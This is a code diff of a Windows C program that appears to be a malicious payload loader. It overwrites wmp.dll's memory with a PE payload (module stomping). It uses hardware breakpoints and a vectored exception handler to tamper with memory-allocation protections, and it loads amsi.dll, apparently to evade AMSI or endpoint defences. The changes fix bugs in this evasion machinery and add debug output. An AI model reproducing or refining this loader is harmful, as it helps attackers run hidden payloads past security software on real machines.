@@ -57,7 +57,7 @@ DWORD RvaToFoa(DWORD rva, PIMAGE_NT_HEADERS nt) {
 
 VOID FixRelocation(PVOID pMemBase, BYTE* pFileData) {
 	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pFileData);
-	DWORD delta = (ULONGLONG)pMemBase - (ULONGLONG)pNt->OptionalHeader.ImageBase;
+	ULONGLONG delta = (ULONGLONG)pMemBase - (ULONGLONG)pNt->OptionalHeader.ImageBase;
 	if (delta == 0) {
 		return;
 	}
@@ -80,7 +80,7 @@ VOID FixRelocation(PVOID pMemBase, BYTE* pFileData) {
 
 
 VOID SetProtection(PVOID pMemBase, BYTE* pFileData) {
-	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pFileData);
+	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pMemBase);
 	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNt);
 	for (size_t i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
 		
@@ -119,8 +119,9 @@ BOOL SetHardwareBreakpoint(PVOID address, PCONTEXT ctx) {
 	if (ctx) {
 		ctx->Dr0 = (DWORD64)address;
 		ctx->Dr7 = 1;
-		ctx->Dr6 = 0;
-		return TRUE;
+		//ctx->Dr6 = 0;
+		//return TRUE;
+		NtContinue(ctx, FALSE);
 	}
 	else {
 		CONTEXT context = { 0 };
@@ -131,7 +132,10 @@ BOOL SetHardwareBreakpoint(PVOID address, PCONTEXT ctx) {
 		context.Dr0 = (DWORD64)address;
 		context.Dr7 = 1;
 
-		return SetThreadContext(hThread, &context);
+		if (!SetThreadContext(hThread, &context)) {
+			return FALSE;
+		}
+		return TRUE;
 	}
 }
 
@@ -170,21 +174,17 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 			
 
 			*allocTypePtr = 0;
-			*protectPtr = PAGE_EXECUTE_READ;
+			*protectPtr = PAGE_EXECUTE_READWRITE;
 
 			ctx->Rax = 0;
 			BYTE* rip = (BYTE*)ctx->Rip;
-			size_t count = 0;
 			while (*rip != 0xc3) {
 				rip++;
-				count++;
-				if (count >= 32) {
-					printf("Cannot find opcode: 0x3c\n");
-					exit(-1);
-				}
 			}
-			printf("count = %zu\n", count);
 			ctx->Rip = (ULONG_PTR)rip;
+			//ULONGLONG ullRetAddr = *(ULONGLONG*)(ctx->Rsp);
+			//ctx->Rip = ullRetAddr;
+			//ctx->Rsp += 8;
 
 			ctx->Dr0 = 0LL;
 			ctx->Dr1 = 0LL;
@@ -194,13 +194,19 @@ BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
 			ctx->Dr7 = 0LL;
 			ctx->EFlags |= 0x10000u;
 
-			NtContinue(ctx, FALSE);
+
+			printf("Rip: 0x%llx\n", ctx->Rip);
+			printf("RSP=%p\n", ctx->Rsp);
+			printf("RFLAGS=%llx\n", ctx->EFlags);
+			printf("CS=%x SS=%x\n", ctx->SegCs, ctx->SegSs);
+			NTSTATUS status = NtContinue(ctx, FALSE);
+			if (status < 0) {
+				printf("NtContinue failed in VectoredHandler, NTSTATUS: 0x%08x\n", status);
+			}
 			return EXCEPTION_CONTINUE_EXECUTION;
 		}
-
 		NtContinue(ctx, FALSE);
 		return EXCEPTION_CONTINUE_EXECUTION;
-	
 	}
 	
 //	return FALSE;
@@ -216,7 +222,6 @@ BOOL MovePayloadToMemory(PVOID pDest, BYTE* pPayloadData, DWORD dwPayloadSize) {
 		memcpy(pSectionDest, pSectionSrc, pSectionHeader->SizeOfRawData);
 		pSectionHeader++;
 	}
-
 	return TRUE;
 }
 
@@ -269,6 +274,7 @@ int main() {
 	PIMAGE_NT_HEADERS pWmpNtHeader = RtlImageNtHeader(pBaseAddress);
 	//clear wmp.dll's memory
 	DWORD dwImageSize = pWmpNtHeader->OptionalHeader.SizeOfImage;
+	//DWORD dwImageSize = RtlImageNtHeader(pPlayloadData)->OptionalHeader.SizeOfImage;
 	DWORD dwOldProtect = 0;
 	if (!VirtualProtect(pBaseAddress, dwImageSize, PAGE_READWRITE, &dwOldProtect)) {
 		printf("Failed to change memory protection. Error code: %lu\n", GetLastError());
@@ -294,6 +300,9 @@ int main() {
 	if (!handle) {
 		printf("Fail to load amsi.dll. Error: 0x%08x", GetLastError());
 		return -1;
+	}
+	else {
+		printf("Continue...\n");
 	}
 	RemoveVectoredExceptionHandler(VectoredHandler);
 
